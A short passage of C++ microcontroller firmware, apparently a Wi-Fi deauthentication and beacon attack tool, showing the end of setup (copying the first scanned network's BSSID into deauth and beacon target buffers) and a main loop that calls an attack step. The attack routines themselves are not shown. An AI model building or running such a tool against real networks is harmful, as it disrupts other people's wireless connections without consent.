  delay(settingScanTimeSec * 1000);

  if (scan_results.size() > 0) {
    selectedIdx = 0;
    networkIdx  = 0;
    memcpy(deauth_bssid, scan_results[0].bssid, 6);
    memcpy(beacon_bssid, scan_results[0].bssid, 6);
  }

  delay(1000);  // let title screen sit a moment
  appState = STATE_MAIN_MENU;
}

// ─────────────────────────────────────────────────────────────────────────────
// Main loop — fully non-blocking
// ─────────────────────────────────────────────────────────────────────────────
void loop() {
  handleWebClient();
  checkScanComplete();
  handleButtons();
  runAttackStep();
  updateDisplay();
}
